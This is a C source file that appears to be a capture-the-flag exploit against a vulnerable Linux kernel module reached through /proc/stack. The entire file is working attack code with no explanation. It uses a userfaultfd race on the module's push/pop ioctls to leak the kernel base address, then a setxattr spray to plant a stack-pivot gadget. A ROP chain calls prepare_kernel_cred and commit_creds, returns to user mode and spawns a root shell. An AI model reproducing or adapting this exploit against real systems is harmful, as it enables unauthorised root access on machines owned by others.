#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/xattr.h>
#include <sys/syscall.h>

struct state{
	unsigned long rip;
	unsigned long cs;
	unsigned long rflags;
	unsigned long rsp;
	unsigned long ss;

} stat_;

void shell(void){
	char *argv[] = {"/bin/sh", NULL};
	printf("congratz! %d\n", getuid());
	execve(argv[0], argv, NULL);

}

int fd;
long base_address;

#define PUSH_IOCTL 0x57ac0001
#define POP_IOCTL  0x57ac0002

#define PUSH(p) ioctl(fd, PUSH_IOCTL, p)
#define POP(p)  ioctl(fd, POP_IOCTL, p)

unsigned long offset_(unsigned long p){
	unsigned long result = p + base_address;
	return result;
}

static void save_state(void){
	register long *rsp asm("rsp");
	asm(
		"mov rax, ss\n"
		"push rax\n"
		"lea rax, [rsp+0x18]\n"
		"push rax\n"
		"pushfq\n"
		"mov rax, cs\n"
		"push rax\n"
		"mov rax, [rbp+0x8]\n"
		"push rax\n"	
					);
	memcpy(&stat_, rsp, sizeof(stat_));
	asm("add rsp, 0x28");
}

unsigned long leak = 0x30;

void errExit(char* msg){puts(msg); exit(-1);}

static void* fault_handler_thread(void* arg){
	printf("Hello from the other thread.\n");
	
	struct pollfd pollfd;
	static struct uffd_msg msg;
	long uffd = (long) arg;

	for(;;){
		pollfd.fd = uffd;
		pollfd.events = POLLIN;

		poll(&pollfd, 1, -1);

		read(uffd, &msg, sizeof msg);
		if(msg.event & UFFD_EVENT_PAGEFAULT){
			struct uffdio_range range;
			range.start = (u_int64_t)msg.arg.pagefault.address;
			range.len = 4096*4;

			POP(&leak);
			printf("KERNEL ADDRESS LEAKED : @ %p\n", leak);
			base_address = leak - 0x13be80;
			printf("KERNEL BASE ADDRESS : @ %p\n", base_address);

			//Unset the read permission bit.

			mprotect((void*) range.start, range.len, PROT_NONE);
			ioctl(uffd, UFFDIO_UNREGISTER, &range);
		}

	}

	return;
}

int main(){

	setbuf(stdout, NULL);
	save_state();
	stat_.rip = shell;
	printf("rip %p\n", stat_.rip);
	printf("CS register %p\n", stat_.cs);
	printf("rflags %p\n", stat_.rflags);
	printf("rsp %p\n", stat_.rip);
	printf("ss %p\n\n", stat_.ss);
	
	int len = 4096*4;

	char* mmaped_chunk = mmap(0x0, len, PROT_READ|PROT_WRITE
				, MAP_PRIVATE|MAP_ANONYMOUS
				, -1, 0);

	printf("MMAPED CHUNK : %p\n", mmaped_chunk);
	
	long uffd;
	struct uffdio_register uffdio_register;
	struct uffdio_api uffdio_api;

	uffd = syscall(__NR_userfaultfd, O_CLOEXEC|O_NONBLOCK);
	if(uffd == -1)
		errExit("syscall fault!\n");


	uffdio_api.api = UFFD_API;
	uffdio_api.features = 0;

	if(ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
		errExit("ioctl : UFFDIO_API\n");

	uffdio_register.range.start = (unsigned long) mmaped_chunk;
	uffdio_register.range.len = len;
	uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
	if(ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
		errExit("ioctl : UFFDIO_REGISTER\n");

	pthread_t p;
	p = pthread_create(&p, NULL, fault_handler_thread, (void *)uffd);
	
	fd = open("/proc/stack", O_RDWR);
	if(fd<0){
		printf("Are you sure you imported the module?\n");
	}

	int fd2 = open("/proc/self/stat", O_RDONLY);
	close(fd2);

	PUSH(mmaped_chunk);
	
	unsigned long pop_rsi = offset_(0x47a8e);
	unsigned long swapgs_poprbp = offset_(0x3ef24);
	unsigned long stack_pivot = offset_(0x5832b); 	//mov esp, 0x83C389C0 ; ret
	unsigned long commit_creds = offset_(0x69c10);
	unsigned long prepare_kernel_cred = offset_(0x69e00);
	unsigned long mov_cr3_edi = offset_(0x3ee74);
	unsigned long pop_rdi = offset_(0x34505);
	unsigned long iretq = offset_(0x1d5c6);
	unsigned long ret2usermode = offset_(0x600a34);
	unsigned long mov_rdi_rax_pop_rbp = offset_(0x1877f);

	fd2 = open("/proc/self/stat", O_RDONLY);

	unsigned long buf[4];
	buf[3] = stack_pivot;
	
	setxattr("/tmp", "x", buf, 0x20, XATTR_CREATE);

	unsigned long * my_stack = mmap(0x83C30000, 0x10000, PROT_WRITE|PROT_READ, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	
	
	if(my_stack != 0x83C30000){
		printf("MMAP returned this : %p\n", my_stack);
		exit(0);
	}

	my_stack += 0x89C0/sizeof(unsigned long);
	
	
	*(my_stack++) = pop_rdi;
	*(my_stack++) = 0;
	*(my_stack++) = prepare_kernel_cred;
	*(my_stack++) = mov_rdi_rax_pop_rbp;
	*(my_stack++) = 0;
	*(my_stack++) = commit_creds;
	*(my_stack++) = ret2usermode + 0x36;
	*(my_stack++) = 0;
	*(my_stack++) = 0;
	
	memcpy(my_stack, &stat_, sizeof(stat_));
	
	//the trigger.
	read(fd2, NULL, 0);

	return 0;
}
